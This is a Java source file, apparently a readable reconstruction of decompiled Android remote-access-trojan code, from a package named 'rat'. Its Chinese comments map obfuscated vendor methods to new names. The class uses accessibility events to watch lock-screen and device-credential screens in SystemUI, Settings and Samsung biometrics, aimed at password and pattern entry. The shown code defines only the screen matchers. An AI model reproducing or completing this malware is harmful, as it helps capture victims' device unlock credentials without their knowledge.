package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * 设备凭证验证代理 (锁屏密码/图案/指纹)
 *
 * Vendor: o/h.java (196 行)
 * 功能: 监听 systemui/settings 中的设备凭证验证界面
 *       配置 EventSubscribe 监听密码输入、图案绘制等事件
 *       支持 systemui / settings / samsung biometrics 三个包名
 *
 * 字段对齐: (无实例字段，仅静态方法)
 *
 * 方法对齐:
 *   H(str) → createUseCredentialFilter(str)
 *   I(str) → createCredentialNoneWindow(str)
 *   J(str) → createCredentialActivityWindow(str)
 *   K(str) → createLockPasswordWindow(str)
 *   L(str) → createTitleFilter(str)
 *   M()    → createListenWindows()
 *   N(str) → createPasswordEditSubscribe(str)
 *   O(str) → createLockPatternSubscribe(str)
 *   P(str) → createOppoLockPatternSubscribe(str)
 *   Q(str) → createUseCredentialSubscribe(str)
 *   R(str) → createUseCredentialLayoutWindow(str)
 *   equals/hashCode → singleton pattern
 *   u()    → onAccessibilityEvent (pass-through)
 */
public class DeviceCredentialDelegate extends AutoEngine {

    private static final String TAG = "DevCredDelegate";

    private static final String SYSTEM_UI = "com.android.systemui";
    private static final String SETTINGS = "com.android.settings";
    private static final String SAMSUNG_BIOMETRICS = "com.samsung.android.biometrics.app.setting";

    public DeviceCredentialDelegate() {
        super(createListenWindows(), SYSTEM_UI);
    }

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
        // ADAPT: vendor u() 仅调用 super.u()，无额外逻辑
    }

    // ============ 窗口匹配器 ============

    /**
     * ADAPT: H(str) → 创建 "使用凭证" 按钮过滤器
     */
    public static CombineFilter createUseCredentialFilter(String pkg) {
        return CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.viewId(pkg + ":id/button_use_credential"));
    }

    /**
     * ADAPT: I(str) → 创建无特定 Activity 的凭证窗口 (带 EventSubscribe)
     */
    public static WindowMatcher createCredentialNoneWindow(String pkg) {
        return new WindowMatcher(pkg)
                .addEventType(32).addEventType(2048).addEventType(16384);
    }

    /**
     * ADAPT: J(str) → 创建 ConfirmDeviceCredentialActivity 窗口
     */
    public static WindowMatcher createCredentialActivityWindow(String pkg) {
        return new WindowMatcher(pkg,
                "com.android.settings.password.ConfirmDeviceCredentialActivity")
                .addEventType(32).addEventType(2048).addEventType(16384);
    }

    /**
     * ADAPT: K(str) → 创建 ConfirmLockPassword 窗口
     */
    public static WindowMatcher createLockPasswordWindow(String pkg) {
        return new WindowMatcher(pkg,
                "com.android.settings.password.ConfirmLockPassword")
                .addEventType(32).addEventType(2048).addEventType(16384);
    }

    /**
     * ADAPT: L(str) → 创建标题过滤器
     */
    public static CombineFilter createTitleFilter(String pkg) {
        return CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.viewId(pkg + ":id/title"));
    }

    /**
     * ADAPT: M() → 创建所有监听窗口列表
     * 为 systemui / settings / samsung biometrics 各创建 4 种窗口
     */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        String[] packages = { SYSTEM_UI, SETTINGS, SAMSUNG_BIOMETRICS };
        for (String pkg : packages) {
            list.add(createUseCredentialLayoutWindow(pkg));
            list.add(createCredentialActivityWindow(pkg));
            list.add(createCredentialNoneWindow(pkg));
            list.add(createLockPasswordWindow(pkg));
        }
        return list;
    }

    /**
     * ADAPT: R(str) → 创建 "使用凭证" 布局窗口
     */
    public static WindowMatcher createUseCredentialLayoutWindow(String pkg) {
        return new WindowMatcher(pkg, "android.widget.LinearLayout")
                .addEventType(32).addEventType(2048).addEventType(16384);
    }

    // ============ equals/hashCode — singleton 模式 ============

    @Override
    public boolean equals(Object obj) {
        return obj instanceof DeviceCredentialDelegate;
    }

    @Override
    public int hashCode() {
        return Objects.hash(DeviceCredentialDelegate.class.getName());
    }
}
